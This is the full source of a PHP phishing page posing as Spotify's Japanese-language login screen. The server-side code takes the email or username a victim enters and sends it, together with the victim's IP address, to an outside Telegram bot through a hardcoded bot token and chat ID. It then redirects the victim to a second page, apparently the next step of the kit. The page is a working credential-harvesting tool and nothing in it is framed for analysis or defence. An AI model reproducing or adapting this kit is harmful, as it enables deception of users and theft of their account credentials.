<?php
// Enable error reporting for debugging (Remove in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_POST['maix']) ? $_POST['maix'] : '';

    // Validate input


    // Telegram Bot Credentials
   $botToken = "8504390435:AAFTaaG11sbd5VPJQ_tPH0A7ATUFB6QqGuM";  // Replace with your bot token
       $chatId = "-5000770553";      // Replace with your chat ID
    // Format the message
    $message = "🔔 *New Login Attempt* 🔔\n\n" .
               "📧 *Email/User:* `$email`\n" .
               "🌐 *IP Address:* `" . $_SERVER['REMOTE_ADDR'] . "`";

    // Send to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    $context  = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

    // Debugging: Log Telegram response (remove in production)
    if ($response === FALSE) {
        error_log("Failed to send Telegram message.");
    } else {
        error_log("Telegram Response: " . $response);
    }

    // Redirect user to another script after login
header("Location: index2.php");
exit;
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Spotify</title>
    <link rel="stylesheet" href="./img/style.css">
    <link rel="stylesheet" href="./img/all.min.css">
    <link rel="icon" href="https://img.icons8.com/ios11/512/spotify.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
</head>
<body>
    <nav>
        <p class="logo-name"></p>
    </nav>
    <div class="lawl-navdzb">
        <h1 class="rass">おかえりなさい</h1>
<div class="dkhl-tari9a">
    <div class="tari9a1">
        <img class="inx" src="./img/gl.svg">
        <a href="loading.html" class="dkhl-text">Googleで続行</a>
    </div>
    <div class="tari9a2">
        <img class="inx" src="./img/fb.svg">
        <a href="loading.html" class="dkhl-text">Facebookで続行</a>
    </div>
    <div class="tari9a3">
        <img class="inx" src="./img/ap.svg">
        <a href="loading.html" class="dkhl-text">Appleで続行</a>
    </div>

</div>

<form method="post" class="dkhl-sift">
    <table>
        <tr>
            <td class="labels">メールアドレスまたはユーザー名
</td>
        </tr>
<tr>
    <td class="flds">
        <input type="text"
               name="maix"
               placeholder=""
               class="inp-gib"
               required
               onfocus="this.placeholder=''"
               onblur="this.placeholder=''"
               style="
                    width: 100%;
                    max-width: 380px;
                    padding: 14px 16px;
                    font-size: 16px;
                    border-radius: 10px;
                    border: 1px solid #ccc;
                    margin-bottom: 4px;
                    display: block;
               ">
    </td>
</tr>


    </table>
    <button class="log-in-btn">続行</button>
    <a href="#" class="link">アカウントをお持ちではありませんか？
</a>
</form>


    <script src="./img/jquery.min.js"></script>
    <script>
        $(".psh").click(function () {
            $(this).toggleClass("fa-eye fa-eye-slash");
            var input = $($(this).attr("toggle"));
            if (input.attr("type") == "password") {
                input.attr("type", "text");
            } else {
                input.attr("type", "password");
            }
        });
    </script>
</body>
</html>
